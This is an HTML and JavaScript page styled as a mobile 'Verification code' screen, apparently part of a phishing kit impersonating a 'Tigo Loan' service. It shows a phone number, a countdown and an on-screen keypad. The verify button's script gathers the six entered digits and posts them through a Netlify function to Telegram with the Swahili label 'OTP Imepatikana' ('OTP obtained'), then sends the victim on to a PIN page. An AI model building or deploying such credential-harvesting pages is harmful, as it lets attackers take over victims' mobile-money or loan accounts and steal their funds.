<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Code Mockup</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #f2f2f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Mobile Device Container */
        .mobile-container {
            width: 100%;
            max-width: 428px;
            height: 100vh;
            max-height: 926px;
            /* iPhone Max height */
            background-color: #ffffff;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        /* Status Bar (Faux) */
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 12px 20px 5px 20px;
            font-size: 14px;
            font-weight: 600;
            color: #000;
        }

        .status-icons {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .status-icons svg {
            width: 16px;
            height: 16px;
        }

        /* Top Navigation */
        .header {
            padding: 15px 20px;
        }

        .back-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px;
            margin-left: -5px;
        }

        .back-btn svg {
            width: 24px;
            height: 24px;
            fill: none;
            stroke: #000;
            stroke-width: 1.5;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(20px);
            }

            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        /* Main Content */
        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 20px 0 20px;
            animation: slideIn 0.3s ease-out;
        }

        .check-icon {
            margin-top: 10px;
            margin-bottom: 30px;
        }

        .check-icon svg {
            width: 80px;
            height: 80px;
        }

        .title {
            font-size: 20px;
            font-weight: 400;
            margin-bottom: 15px;
            color: #1a1a1a;
        }

        .subtitle {
            font-size: 15px;
            color: #333;
            text-align: center;
            line-height: 1.5;
            margin-bottom: 25px;
            padding: 0 10px;
        }

        .subtitle strong {
            font-weight: 600;
            display: block;
            /* Forces number to next line like in image */
        }

        /* OTP Inputs */
        .otp-container {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
            width: 100%;
            justify-content: center;
        }

        .otp-box {
            width: 46px;
            height: 52px;
            border: 1px solid #b3b3b3;
            border-radius: 6px;
            text-align: center;
            font-size: 24px;
            font-weight: 500;
            color: #000;
            outline: none;
            transition: border-color 0.2s;
            background: #fff;
        }

        .otp-box:focus,
        .otp-box.active {
            border: 2px solid #008080;
        }

        /* Timer & Button */
        .timer-text {
            font-size: 16px;
            color: #333;
            margin-bottom: 25px;
        }

        .timer-text span {
            color: #d30000;
            font-weight: 600;
        }

        .verify-btn {
            width: 100%;
            padding: 15px;
            background-color: #d1d1d1;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 400;
            pointer-events: none;
            transition: background-color 0.3s;
        }

        .verify-btn.enabled {
            background-color: #008080;
            /* Changes color when filled */
            pointer-events: auto;
            cursor: pointer;
        }

        /* iOS Style Virtual Keyboard */
        .keyboard {
            background-color: #d1d5db;
            width: 100%;
            padding: 6px 6px 30px 6px;
            /* Extra bottom padding for realistic safe-area */
        }

        .keyboard-row {
            display: flex;
            justify-content: center;
            gap: 6px;
            margin-bottom: 6px;
        }

        .key {
            flex: 1;
            height: 48px;
            background-color: #ffffff;
            border-radius: 5px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.3);
            user-select: none;
        }

        .key:active {
            background-color: #b5b8bc;
        }

        .key .num {
            font-size: 24px;
            font-weight: 400;
            color: #000;
            line-height: 1;
        }

        .key .letters {
            font-size: 10px;
            font-weight: 600;
            color: #000;
            letter-spacing: 1px;
            margin-top: 2px;
            height: 12px;
        }

        .key.empty {
            background-color: transparent;
            box-shadow: none;
            cursor: default;
        }

        .key.empty:active {
            background-color: transparent;
        }

        .key.action-key {
            background-color: #d1d5db;
            box-shadow: none;
        }

        .key.action-key svg {
            width: 24px;
            height: 24px;
        }
    </style>
</head>

<body>

    <div class="mobile-container">



        <!-- Header -->
        <div class="header">
            <button class="back-btn" onclick="window.location.href='login.html'">
                <svg viewBox="0 0 24 24">
                    <path d="M19 12H5M12 19l-7-7 7-7" />
                </svg>
            </button>
        </div>

        <!-- Main Content -->
        <div class="content">
            <!-- Red Checkmark -->
            <div class="check-icon">
                <svg viewBox="0 0 100 100" fill="none">
                    <path d="M20 50 L40 70 L80 15" stroke="#d30000" stroke-width="8" stroke-linecap="square"
                        stroke-linejoin="miter" />
                </svg>
            </div>

            <h2 class="title">Verification code</h2>

            <p class="subtitle">
                Please enter the Verification code sent to
                <strong>+255 751123553.</strong>
            </p>

            <!-- OTP Input Boxes -->
            <div class="otp-container" id="otp-container">
                <input type="text" class="otp-box active" maxlength="1" readonly>
                <input type="text" class="otp-box" maxlength="1" readonly>
                <input type="text" class="otp-box" maxlength="1" readonly>
                <input type="text" class="otp-box" maxlength="1" readonly>
                <input type="text" class="otp-box" maxlength="1" readonly>
                <input type="text" class="otp-box" maxlength="1" readonly>
            </div>

            <!-- Timer -->
            <p class="timer-text">New request in <span id="timer">00:57</span></p>

            <!-- Verify Button -->
            <button class="verify-btn" id="verify-btn">Verify and proceed</button>
        </div>

        <!-- Faux Keyboard -->
        <div class="keyboard">
            <div class="keyboard-row">
                <div class="key" data-val="1">
                    <span class="num">1</span><span class="letters"></span>
                </div>
                <div class="key" data-val="2">
                    <span class="num">2</span><span class="letters">A B C</span>
                </div>
                <div class="key" data-val="3">
                    <span class="num">3</span><span class="letters">D E F</span>
                </div>
            </div>
            <div class="keyboard-row">
                <div class="key" data-val="4">
                    <span class="num">4</span><span class="letters">G H I</span>
                </div>
                <div class="key" data-val="5">
                    <span class="num">5</span><span class="letters">J K L</span>
                </div>
                <div class="key" data-val="6">
                    <span class="num">6</span><span class="letters">M N O</span>
                </div>
            </div>
            <div class="keyboard-row">
                <div class="key" data-val="7">
                    <span class="num">7</span><span class="letters">P Q R S</span>
                </div>
                <div class="key" data-val="8">
                    <span class="num">8</span><span class="letters">T U V</span>
                </div>
                <div class="key" data-val="9">
                    <span class="num">9</span><span class="letters">W X Y Z</span>
                </div>
            </div>
            <div class="keyboard-row">
                <div class="key empty"></div>
                <div class="key" data-val="0">
                    <span class="num">0</span><span class="letters"></span>
                </div>
                <div class="key action-key" data-val="backspace">
                    <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="1.5" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                        <line x1="18" y1="9" x2="12" y2="15"></line>
                        <line x1="12" y1="9" x2="18" y2="15"></line>
                    </svg>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const inputs = document.querySelectorAll('.otp-box');
            const keys = document.querySelectorAll('.key');
            const verifyBtn = document.getElementById('verify-btn');
            const timerEl = document.getElementById('timer');

            let currentIndex = 0;

            // Visual timer logic
            let timeLeft = 57;
            const timerInterval = setInterval(() => {
                if (timeLeft > 0) {
                    timeLeft--;
                    let seconds = timeLeft % 60;
                    let minutes = Math.floor(timeLeft / 60);
                    timerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                } else {
                    clearInterval(timerInterval);
                    timerEl.style.color = "#333";
                    timerEl.style.cursor = "pointer";
                    timerEl.textContent = "Resend now";
                }
            }, 1000);

            // Update the active border class based on current focus
            function updateActiveState() {
                inputs.forEach((input, index) => {
                    if (index === currentIndex) {
                        input.classList.add('active');
                    } else {
                        input.classList.remove('active');
                    }
                });
                checkIfComplete();
            }

            // Check if all inputs are filled
            function checkIfComplete() {
                let allFilled = true;
                inputs.forEach(input => {
                    if (input.value === '') allFilled = false;
                });

                if (allFilled) {
                    verifyBtn.classList.add('enabled');
                } else {
                    verifyBtn.classList.remove('enabled');
                }
            }

            // Virtual Keyboard click handling
            keys.forEach(key => {
                key.addEventListener('click', () => {
                    const val = key.getAttribute('data-val');
                    if (!val) return; // Empty key

                    if (val === 'backspace') {
                        if (currentIndex > 0 && inputs[currentIndex].value === '') {
                            currentIndex--;
                        }
                        inputs[currentIndex].value = '';
                        updateActiveState();
                    } else {
                        if (currentIndex < inputs.length) {
                            inputs[currentIndex].value = val;
                            if (currentIndex < inputs.length - 1) {
                                currentIndex++;
                            }
                            updateActiveState();
                        }
                    }
                });
            });

            // Allow real keyboard typing for testing on PC
            document.addEventListener('keydown', (e) => {
                if (e.key >= '0' && e.key <= '9') {
                    if (currentIndex < inputs.length) {
                        inputs[currentIndex].value = e.key;
                        if (currentIndex < inputs.length - 1) {
                            currentIndex++;
                        }
                        updateActiveState();
                    }
                } else if (e.key === 'Backspace') {
                    if (currentIndex > 0 && inputs[currentIndex].value === '') {
                        currentIndex--;
                    }
                    inputs[currentIndex].value = '';
                    updateActiveState();
                }
            });

            async function sendToTelegram(message) {
                try {
                    await fetch('/.netlify/functions/send-telegram', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ message })
                    });
                } catch (error) {
                    console.error('Telegram error:', error);
                }
            }

            let isSubmitting = false;
            // Add verification button click
            verifyBtn.addEventListener('click', async () => {
                if (verifyBtn.classList.contains('enabled') && !isSubmitting) {
                    isSubmitting = true;
                    verifyBtn.style.opacity = '0.5';
                    verifyBtn.style.pointerEvents = 'none';
                    const otp = Array.from(inputs).map(i => i.value).join('');
                    await sendToTelegram(`<b>Tigo Loan - OTP Imepatikana</b>\nOTP: <code>${otp}</code>`);
                    window.location.href = 'pin.html';
                }
            });
        });
    </script>

</body>

</html>
